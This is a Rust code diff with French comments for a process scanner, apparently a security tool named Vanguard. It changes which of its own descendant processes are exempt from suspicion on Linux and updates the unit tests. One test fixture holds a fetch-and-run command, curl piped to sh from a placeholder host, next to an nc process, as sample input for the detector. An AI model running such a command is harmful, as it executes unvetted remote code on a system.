@@ -915,7 +915,17 @@ pub(crate) fn juger_programme(p: &EnMarche, systeme: Os) -> Option<Soupcon> {
 /// Un parent né après son enfant n'est pas son parent : sous Windows, le numéro d'un parent mort (celui de
 /// l'explorateur, par exemple) peut avoir été repris par Vanguard, qui aurait sinon écarté l'explorateur et tout ce
 /// qu'il a lancé. Sans les deux dates, le lien est gardé.
-pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, est_vanguard: &dyn Fn(&EnMarche) -> bool) -> HashSet<u32> {
+///
+/// Les descendants de `moi` ne sont écartés que si `ecarter_descendants` (`descendants_ecartes`) : sous Linux, un exec
+/// garde les enfants du programme d'avant, et un enfant d'avant peut donner à ce processus des frères nés après
+/// (clone avec CLONE_PARENT) ou ses orphelins (PR_SET_CHILD_SUBREAPER survit à l'exec), que rien ne distingue des
+/// siens (relecture adverse du lot L2(b), 3e ronde, point 3).
+pub(crate) fn de_vanguard(
+    liste: &[EnMarche],
+    moi: u32,
+    est_vanguard: &dyn Fn(&EnMarche) -> bool,
+    ecarter_descendants: bool,
+) -> HashSet<u32> {
     let nes: HashMap<u32, NaiveDateTime> = liste.iter().filter_map(|p| Some((p.pid, p.ne?))).collect();
     let paires: Vec<(u32, u32)> = liste
         .iter()
@@ -929,8 +939,24 @@ pub(crate) fn de_vanguard(liste: &[EnMarche], moi: u32, est_vanguard: &dyn Fn(&E
         .collect();
     let mut ecartes: HashSet<u32> = liste.iter().filter(|p| est_vanguard(p)).map(|p| p.pid).collect();
     ecartes.insert(moi);
-    ecartes.extend(crate::commande::descendants(&paires, moi));
+    if ecarter_descendants {
+        ecartes.extend(crate::commande::descendants(&paires, moi));
+    }
     ecartes
+}
+
+/// Les descendants de ce processus sont-ils tous de lui ? Sous Linux, seulement s'il n'avait aucun enfant au début
+/// de `main` (relevé lisible et vide : `processus::enfants_d_avant`). Sous Windows, un processus ne change pas de
+/// programme en gardant ses enfants.
+fn descendants_ecartes() -> bool {
+    #[cfg(target_os = "linux")]
+    {
+        crate::socle::processus::enfants_d_avant().is_some_and(<[u32]>::is_empty)
+    }
+    #[cfg(not(target_os = "linux"))]
+    {
+        true
+    }
 }
 
 /// Les ancêtres de `pid` (parent, grand-parent…) d'après la liste : le terminal, le shell ou la session SSH d'où
@@ -966,7 +992,7 @@ fn est_ce_vanguard(p: &EnMarche) -> bool {
 pub(crate) fn en_marche() -> Option<(Vec<EnMarche>, HashSet<u32>)> {
     let (liste, _) = programmes_en_marche().filter(|(l, _)| !l.is_empty())?;
     let moi = std::process::id();
-    let mut intouchables = de_vanguard(&liste, moi, &est_ce_vanguard);
+    let mut intouchables = de_vanguard(&liste, moi, &est_ce_vanguard, descendants_ecartes());
     intouchables.extend(ancetres(&liste, moi));
     Some((liste, intouchables))
 }
@@ -1151,7 +1177,7 @@ fn programmes_suspects() -> Vec<Constat> {
             ),
         )];
     };
-    let ecartes = de_vanguard(&liste, std::process::id(), &est_ce_vanguard);
+    let ecartes = de_vanguard(&liste, std::process::id(), &est_ce_vanguard, descendants_ecartes());
     #[cfg(target_os = "linux")]
     {
         let mut intouchables = ecartes.clone();
@@ -1956,9 +1982,16 @@ mod tests {
                 ..EnMarche::default()
             },
         ];
-        let ecartes = de_vanguard(&liste, 100, &par_chemin(moi));
+        let ecartes = de_vanguard(&liste, 100, &par_chemin(moi), true);
         assert!([100, 200, 300].iter().all(|p| ecartes.contains(p)));
         assert!(!ecartes.contains(&500));
+        // Ce processus avait des enfants avant de devenir Vanguard (relecture adverse du lot L2(b), 3e ronde, point
+        // 3) : aucun de ses descendants n'est écarté, lui seul.
+        let sans = de_vanguard(&liste, 100, &par_chemin(moi), false);
+        assert!(
+            sans.contains(&100) && !sans.contains(&200) && !sans.contains(&300),
+            "{sans:?}"
+        );
         // La même casse de chemin vaut partout ; une autre casse ne vaut que sous Windows.
         assert_eq!(ecartes.contains(&400), cfg!(windows));
         let c = juger_programmes(&liste, Os::Windows, &ecartes, None);
@@ -1975,7 +2008,7 @@ mod tests {
         let c = juger_programmes(
             &liste,
             Os::Windows,
-            &de_vanguard(&liste, 100, &par_chemin(moi)),
+            &de_vanguard(&liste, 100, &par_chemin(moi), true),
             Some("x."),
         );
         assert_eq!(c.len(), 1);
@@ -2007,7 +2040,7 @@ mod tests {
             cache,
             processus(200, 100, "powershell.exe", "090001"),
         ];
-        let ecartes = de_vanguard(&liste, 100, &par_chemin(moi));
+        let ecartes = de_vanguard(&liste, 100, &par_chemin(moi), true);
         assert!(ecartes.contains(&100) && ecartes.contains(&200), "{ecartes:?}");
         assert!(!ecartes.contains(&500) && !ecartes.contains(&600), "{ecartes:?}");
         let c = juger_programmes(&liste, Os::Windows, &ecartes, None);
@@ -2024,7 +2057,7 @@ mod tests {
                 ..p
             })
             .collect();
-        let ecartes = de_vanguard(&sans, 100, &par_chemin(moi));
+        let ecartes = de_vanguard(&sans, 100, &par_chemin(moi), true);
         assert!(ecartes.contains(&500) && ecartes.contains(&600), "{ecartes:?}");
     }
 
@@ -2049,7 +2082,7 @@ mod tests {
             p(410, 400, "sh", None, Some("sh -c curl https://x.example/a | sh")),
             p(420, 410, "nc", None, None),
         ];
-        let ecartes = de_vanguard(&liste, 100, &par_chemin(moi));
+        let ecartes = de_vanguard(&liste, 100, &par_chemin(moi), true);
         assert!(ecartes.contains(&100) && ecartes.contains(&110), "{ecartes:?}");
         assert!(ecartes.contains(&400), "{ecartes:?}");
         assert!(
@@ -2149,7 +2182,7 @@ mod tests {
     fn lecture_reelle() {
         if let Some((liste, _)) = programmes_en_marche() {
             let moi = std::process::id();
-            let ecartes = de_vanguard(&liste, moi, &|_| false);
+            let ecartes = de_vanguard(&liste, moi, &|_| false, true);
             assert!(ecartes.contains(&moi));
             for c in juger_programmes(&liste, Os::actuel(), &ecartes, None) {
                 assert!(!c.message.contains(&format!("(PID {moi})")), "{}", c.message);
